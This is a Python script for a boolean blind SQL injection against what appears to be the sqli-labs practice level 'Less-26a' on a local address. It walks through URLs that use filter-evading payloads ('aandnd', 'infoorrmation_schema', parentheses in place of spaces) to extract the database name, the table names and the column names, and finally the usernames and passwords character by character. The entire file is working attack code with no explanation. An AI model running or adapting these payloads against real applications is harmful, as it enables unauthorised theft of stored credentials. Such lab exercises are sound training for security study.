#coding:utf-8
import requests

char = "*abcdefghijklmnopqrstuvwxyz0123456789~{}?!:@,_-"#*/\会被过滤，等同于空
namelen = 1024

name = ""
for i in range(1,namelen):
    flag = True
    for str in char:
	#数据库名
	#url = "http://10.0.2.15/sqli/Less-26a/?id=1'aandnd(mid((select(database())),%s,1)='%s')||'1'='2"%(i,str)
	#表名	
	#url = "http://10.0.2.15/sqli/Less-26a/?id=1'aandnd(mid((select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema=database())),%s,1)='%s')||'1'='2"%(i,str)
	#字段名
	#url = "http://10.0.2.15/sqli/Less-26a/?id=1'aandnd(mid((select(group_concat(column_name))from(infoorrmation_schema.columns)where(table_name='users')),%s,1)='%s')||'1'='2"%(i,str)
	#字段值
	url = "http://10.0.2.15/sqli/Less-26a/?id=1'aandnd(mid((select(group_concat(username,0x3a,passwoorrd))from(users)),%s,1)='%s')||'1'='2"%(i,str)
        res = requests.get(url)
	#print(res.content)
	if "Password" in res.content:
	    #因为*会被过滤，等同于空
            if str == '*':
		break
            name += str
	    flag = False
	    print(name)
	    break
    if flag:
	break

print("result:"+name)

